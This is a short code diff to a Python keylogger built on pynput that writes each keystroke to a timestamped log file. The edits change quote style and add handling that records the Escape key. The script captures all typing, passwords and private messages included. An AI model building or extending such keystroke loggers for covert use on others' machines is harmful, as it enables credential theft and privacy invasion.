@@ -8,7 +8,8 @@ from pynput.keyboard import Key, Listener
 if not os.path.exists("data"):
     os.makedirs("data")
 
-LOG_FILE = "data/" + str(datetime.today().strftime('%Y-%m-%d-%H:%M:%S')) + ".txt"
+LOG_FILE = "data/" + str(datetime.today().strftime("%Y-%m-%d-%H:%M:%S")) + ".txt"
+
 
 def on_press(key):
     with open(LOG_FILE, "a") as log:
@@ -21,6 +22,8 @@ def on_press(key):
             key = ""
         elif key == "Key.backspace":
             key = " [Backspace] "
+        elif key == "Key.esc":
+            key = " [Escape] "
         log.write(key)
 
 
